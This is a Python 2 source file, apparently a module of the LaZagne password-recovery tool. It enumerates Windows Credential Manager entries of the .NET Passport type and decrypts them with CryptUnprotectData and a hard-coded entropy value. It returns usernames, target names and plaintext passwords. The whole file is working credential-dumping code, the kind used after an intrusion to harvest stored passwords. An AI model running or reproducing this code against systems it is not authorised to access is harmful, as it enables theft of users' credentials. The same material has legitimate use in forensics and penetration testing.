import struct
from ctypes import *
from ctypes.wintypes import DWORD
import win32cred
from lazagne.config.constant import *
from lazagne.config.write_output import print_debug
from lazagne.config.moduleInfo import ModuleInfo

memcpy = cdll.msvcrt.memcpy
LocalFree = windll.kernel32.LocalFree
CryptUnprotectData = windll.crypt32.CryptUnprotectData
CRYPTPROTECT_UI_FORBIDDEN = 0x01

class DATA_BLOB(Structure):
	_fields_ = [
		('cbData', DWORD),
		('pbData', POINTER(c_char))
	]

class Dot_net(ModuleInfo):
	def __init__(self):
		options = {'command': '-d', 'action': 'store_true', 'dest': 'dotnet', 'help': 'domain visible network (.Net Passport) Passwords'}
		ModuleInfo.__init__(self, 'Dot Net', 'windows', options)

	def getData(self, blobOut):
		cbData = int(blobOut.cbData)
		pbData = blobOut.pbData
		buffer = c_buffer(cbData)
		memcpy(buffer, pbData, cbData)
		LocalFree(pbData);
		return buffer.raw

	def get_creds(self):
		try:
			creds = win32cred.CredEnumerate(None, 0)
			return creds
		except Exception,e:
			print_debug('DEBUG', '{0}'.format(e))
			return None

	def get_entropy(self):
		entropy = '82BD0E67-9FEA-4748-8672-D5EFE5B779B0\0'
		s = ''
		for c in entropy:
			s += struct.pack('<h', ord(c) << 2)
			entropy = s
		return s

	def Win32CryptUnprotectData(self, cipherText, entropy):
		bufferIn = c_buffer(cipherText, len(cipherText))
		blobIn = DATA_BLOB(len(cipherText), bufferIn)
		bufferEntropy = c_buffer(entropy, len(entropy))
		blobEntropy = DATA_BLOB(len(entropy), bufferEntropy)
		blobOut = DATA_BLOB()
		if CryptUnprotectData(byref(blobIn), None, byref(blobEntropy), None, None, CRYPTPROTECT_UI_FORBIDDEN, byref(blobOut)):
			return self.getData(blobOut)
		else:
			return 'failed'

	def run(self, software_name = None):	
		a = self.get_creds()
		pwd = ''
		pwdFound = []
		if a:
			for i in a:
				values = {}
				if i['Type'] == win32cred.CRED_TYPE_DOMAIN_VISIBLE_PASSWORD:
					cipher_text = i['CredentialBlob']
					pwd = self.Win32CryptUnprotectData(cipher_text, self.get_entropy())
					if pwd != 'failed':
						values['TargetName'] = i['TargetName'] 
						if i['UserName'] is not None:
							values['Username'] = i['UserName']
						try:
							values['Password'] = pwd.decode('utf16')
						except Exception,e:
							print_debug('DEBUG', '{0}'.format(e))
							values['INFO'] = 'Error decoding the password'
						
						pwdFound.append(values)

			return pwdFound

		else:
			print_debug('INFO', 'No credentials listed with the enum cred function')
		

